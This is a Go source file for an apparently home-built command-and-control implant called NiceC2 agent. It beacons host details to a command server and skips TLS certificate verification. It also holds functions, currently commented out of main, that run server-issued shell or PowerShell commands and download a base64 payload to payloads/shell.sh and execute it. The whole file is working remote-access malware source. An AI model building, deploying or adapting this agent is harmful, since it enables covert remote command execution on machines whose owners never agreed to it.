package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"

	// "io/ioutil"
	b64 "encoding/base64"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/denisbrodbeck/machineid"
	// "github.com/mitchellh/go-homedir"
)

// Setting the command server
// var command_server string = "http://192.168.0.69:8081"

var command_server string = "https://localhost:8081"

// var command_server string = "http://192.168.0.29:8081"

// Variables assigned later
var NodeID string = "" // This will be a GUID at some point

type CheckIn struct {
	ID       string `json:"ID"`
	Hostname string `json: "Hostname"`
	Platform string `json:"Platform"`
}

type CheckIn_response struct {
	Message string `json:"message"`
}

type command struct {
	ID      string `json:"ID"`
	Command string `json:"command"`
	Details string `json:"details"`
}

// Checking errors
func check(e error) {
	if e != nil {
		panic(e)
	}
}

// global stuff for shortcuts
var p = fmt.Println

func main() {

	Banner := `
███████████████████████████████████████████████████████████████████████████████████████████████
███    ██ ██  ██████ ███████  ██████ ██████       █████   ██████  ███████ ███    ██ ████████  
████   ██ ██ ██      ██      ██           ██     ██   ██ ██       ██      ████   ██    ██    
██ ██  ██ ██ ██      █████   ██       █████      ███████ ██   ███ █████   ██ ██  ██    ██    
██  ██ ██ ██ ██      ██      ██      ██          ██   ██ ██    ██ ██      ██  ██ ██    ██    
██   ████ ██  ██████ ███████  ██████ ███████     ██   ██  ██████  ███████ ██   ████    ██    
███████████████████████████████████████████████████████████████████████████████████████████████                                                                                                                                                                                       
`

	fmt.Println(Banner)

	NodeID, _ = machineid.ID()

	// old_checkIn()

	// getFIle()

	// scriptOutput := run_script("payloads/shell.sh")

	// fmt.Println(scriptOutput)

	// checkIn()

	// // Get's the current time, and formats it. god this is weird
	// current_time := time.Now().Format("2006.01.02 15:04:05")

	// var home string
	// home, _ = os.UserHomeDir()

	// var testFile string
	// testFile = filepath.Join(home, "Desktop", "NiceC2 Log file.txt")

	// fmt.Println(testFile)

	// // Opens/creates the file in a way that it can be appended to
	// file, err := os.OpenFile(testFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	// // Error if you can't open/edit the file
	// if err != nil {
	// 	fmt.Println("Could not open example.txt")
	// 	return
	// }

	// defer file.Close()

	// _, err2 := file.WriteString("The time is: " + current_time + "\n")

	// if err2 != nil {
	// 	fmt.Println("Could not write text to example.txt")

	// } else {
	// 	fmt.Println("Operation successful! Text has been appended to example.txt")
	// }

	// // // Sleeps 10 seconds, then does it again. Damn look at that recursion
	// // time.Sleep(10 * time.Second)
	// // main()

	// Checks in every 10 seconds.
	// for {
	// 	time.Sleep(10 * time.Second)
	// 	checkIn()
	// }

	checkIn()

}

func checkIn() {

	// This allows us to use a self signed certificate.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Getting the info
	hostname, _ := os.Hostname()
	platform := runtime.GOOS

	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	// Bit of UI for you
	if res.StatusCode == 200 {
		fmt.Println("Response was OK")
	} else {
		fmt.Println("Response was Not OK")
	}

	post := &CheckIn_response{}
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		panic(derr)
	}

	fmt.Println(post.Message)
}

func old_checkIn() {

	// Getting the info
	hostname, _ := os.Hostname()
	platform := runtime.GOOS

	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/old-checkin", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	fmt.Println(res.StatusCode)

	fmt.Println("here")

	// Parse the JSON response
	post := &command{}
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		panic(derr)
	}

	fmt.Println("And here")
	// Output the JSON response
	fmt.Println("ID: ", post.ID)
	fmt.Println("Command: ", post.Command)
	fmt.Println("Details: ", post.Details)

	// If the command is run, then the the command
	if post.Command == "run" {
		runCommand(post.Details)
	}

}

func getFIle() {

	fmt.Println("\nStarting the getting file thing")

	data := map[string]string{"ID": NodeID}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	fmt.Println(res.StatusCode)

	// Parse the JSON response
	post := &command{}

	fmt.Println(1)
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		panic(derr)
	}

	// Decoding the body so it's readable
	details, _ := b64.StdEncoding.DecodeString(post.Details)
	fmt.Println(string(details))

	// Output the JSON response
	fmt.Println("ID: ", post.ID)
	fmt.Println("Command: ", post.Command)
	fmt.Println("Details: ", string(details))

	// Write the string to file
	script_to_file(string(details))

}

func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		p(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			p(err.Error())
			errorMessage = err.Error()

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {
		p(err.Error())
		errorMessage = err.Error()

		return
	}

	outString = string(out)

	return

}

func script_to_file(input string) {

	f, err := os.Create("payloads/shell.sh")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	data := []byte(input)

	_, err2 := f.Write(data)

	if err2 != nil {
		log.Fatal(err2)
	}

	return
}

func run_script(path_to_script string) (output string) {

	output = ""

	out, err := exec.Command("sh", path_to_script).Output()
	if err != nil {
		fmt.Println("Error executing script")
	}

	output = string(out)

	return output

}
